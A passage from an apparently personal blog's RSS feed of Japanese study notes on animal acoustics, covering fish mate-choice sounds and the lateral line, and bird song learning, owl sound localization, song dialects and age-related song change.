一方で，配偶者選択にどのように使われているかはまだ研究されている． 例えばカエルは広告音として音を出し，自分の繁殖モチベーションを伝えるとともに繁殖可能なメスを 誘引することができるが，スズメダイの繁殖音も同様に遠くまで遠く伝わることが知られている． しかし，どのような要因でつがいの選択をしているかということは知られていない． 例えば体の大きなオスは体の強さからメスが引き寄せられる要因の一つとして上げられる． 体の大きさを判別する特徴の一つは，例えば周波数特性や強度，パルス音の持続時間などである． また，これ以外にも体の健康状態などが指標に上げられるという説もある．
側線器官 側線は，ごく小さな穴がならんだ点線が並んだようになっていて，この数は魚によって変化する． これは内耳の有毛細胞とよく似た仕組みを持っていて，感覚毛にある 刺激受容体が，水の動きに反応してその電位を変化させる． これが感覚神経によって中枢に伝達される． この側線器官は単に音だけでなく，水流を感知するためにも使われている． 魚は上流に向かって体を保持する特性があるが，その際に水流を感知する必要がある． この水流は，とくに流速に勾配がある際に有効に感知できることが知られている． これ以外にも，洞窟魚(盲目な魚類)は側線感覚を使って活動するが， 例えば壁に近づくと，水圧・水流が強くなるため，その勾配を側線器官によって感知できるらしい． 活動以外には採餌活動に使われる．餌の対象が近くに来ると水流が変化するので，見つけることができる． 餌によって水流の変化が違うのか気になる． 採餌でなくても，群遊泳に使われるという傾向がある．しかし，群遊泳はどちらかというと 視覚情報を使っていて，側線器官はどちらかというと補助的な役割であることが報告されている．</description>
    </item>
    
    <item>
      <title>鳥類</title>
      <link>http://side-realms.github.io/sound/bird/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/bird/</guid>
      <description>鳴禽類 鳴禽類は例えば雀やカナリアなどの鳥類で，二種類の音声で鳴く． 一つは地鳴きといい，警戒音など生まれつき発生することができる音声がある． 二つ目はソングといい，複数の音がある規則に従って連なる音声のことをいう． 求愛や縄張り争いに使われ，幼鳥期に会得する．幼鳥期は歌を学習する必要があるが，それは二段階に分かれている． 最初は感覚学習期といい，お手本となる歌を聴いて自信の記憶を形成する． 次に感覚運動学習期では，その歌を実現しようと練習する． 人間と同じで自分の発声とそのフィードバックを得て修正を繰り返しながら発声を練習する． ジュウシマツとコシジロキンパラはその学習過程でよく比較されるが，ジュウシマツとコシジロキンパラはその文法学習に差がある． ジュウシマツは音素を複雑に構成して歌を形成する． しかしその歌は規則性があるわけではなく，音素を組み替えて歌うことができる． 一方でコシジロは規則的な・単調な歌しか歌えない． これは里親を変更したときは両鳥ともに単調な歌しか歌えなかったので，ジュウシマツにしか学習能力がないことがわかる． 一方で，鳴禽類以外の鳥は内耳を切除しても普段通りの鳴き声を実現したものもある． そのため，学習せずに遺伝子的に鳴く鳥もある
フクロウ フクロウは当然夜行性なので，優れた視覚と聴覚をもつ．そのために音源定位が必要． 例えばメンフクロウは音の方向に対して顔を向ける性質があるが，これを利用してメンフクロウの 音源定位を調査できる． これを利用するとフクロウの音源定位は人間よりも精度がよく，数度でわかるらしい．すご
フクロウの音源定位のよさは耳の位置による．特にメンフクロウは左耳が右耳よりも高い位置にあり， 左耳は下向きに，右耳は上向きについている．
歌学習 鳴禽類がどのように歌を学習するかは発達過程における環境要因が影響している． 例えば聴覚を除去した鳥は不明瞭かつ不安定な歌を歌う． 一方で，周囲の環境から完全に隔離した鳥類はまったく音素が特徴的な歌を歌うようになる． これ以外にも，遺伝子的な要因で周波数が変化したり，スピーカから学ぶか，成鳥から学ぶかでも変化する． (成鳥の方が精度がよく，コミュニケーションが重要であるといえる．)
鳥類が歌を学ぶ理由はいくつかあるが，主にシグネチャーと求愛である． 歌は土地や育ちによって完全に違うため，そのテリトリーにいた個体であること(侵入者でないこと)の証明として歌を学習し，歌う． このときにオスは，その個体・テリトリーに特有の歌を学ぶのではなく，普遍的な歌を学ぶ必要がある． (付近の歌の規則はよく似ている．) 鳥類はたしかに自分のなわばりの歌を認知することが知られていて， 持ち主のオスがいなくなるとそのなわばりが失われてしまうらしい． また，求愛の際にも歌は重要である． メスは新規性のある歌は好まず，自分のテリトリーに似通った歌を好む傾向にある． ただし，全く違う歌や全く同じ歌は好まず，適応的淘汰に対応した選好がされている． また，メスは「モノマネ」を識別することができる． つまり，多種が真似したソングをそれと認識することができる．
幼鳥を教える際には成鳥は要素をいつもよりも長く歌うらしい． けっこう高度な社会を構築しているように見える．すごいな
鳥類がソングをどのように判別しているかは議論されている． 例えばシジュウカラは，違うソングを聞かせるとその鳴き声が変化することが分かっている． しかし，シジュウカラに馴化や脱馴化はみられない． そのため，どのようにソングを識別しているのか，という点についてはまだ議論されている．
歌の意味 前述のとおり，鳥類における歌はテリトリーの主張や，求愛に使われる． そのためか，メスは歌うことができず，オスだけが歌うことができる． ただしカナリアはメスでも歌い，投薬によってオスほど鳴くことが知られている．
ところで，歌には方言があることが知られている． 大陸では数十キロごとに歌に変化がある．同じ周波数でも規則性が違ったり， 周波数さえ違うこともある． 日本でも同じような現象が見られ，本土と島嶼や島嶼ごとに方言のような差異がみられる． これには環境の変化などが理由に上がる． 例えば，本土は季節ごとにそのなわばりを移動するため，その頻度が多いが， 島嶼の鳥は季節的な移動がないため，なわばり争いの頻度も少ない． また，本土は繁殖失敗の要素が多く(敵の存在)，性淘汰に対する圧力が大きいが， 島嶼はそうではない． あるいは，どんな種類の鳥類がいるか，ということも方言を生み出している． 例えば自分のソングに似た鳥類が周りにいると，不必要な争いに巻き込まれる可能性がある． そこで，方言的にソングを変えることでこうした争いを減らしている． こうした理由が地域差を生み出していると考えられている． このような方言が種別化を生み出すことがあるか，という点は議論されているらしい． おもろ
方言とは関係なく，鳥類はその環境に応じてその鳴き声を適応させる． 例えば騒音がうるさい都市では，そのソングの周波数・音圧・鳴く時間を適応させることが知られている． また，森林では低周波が減衰されにくいため，森林にすむ鳥は低周波の純音を使用する傾向にある．
加齢によって歌は変化する． 経験を重ねるにつれて，歌学習をする鳥類は歌のれぱーとりーが増えたり， 周波数幅や速度の上昇などがみられる．こういった要素からメスはオスの年齢を指標とする． 一方で，加齢によって歌の速度や周波数幅が減少する種別もみられる． こういった歌の加齢による変化は，ないと考えられていた． 幼鳥期のみに歌学習がおこるからである． しかし，こうした加齢によって歌が変化することは減少として確認されており， こうした可塑性がどれほどあるのか，コミュニケーションや社会にどのような 影響を及ぼしているのか，などはほとんどわかっていないらしい．</description>
    </item>
    
  </channel>
</rss>
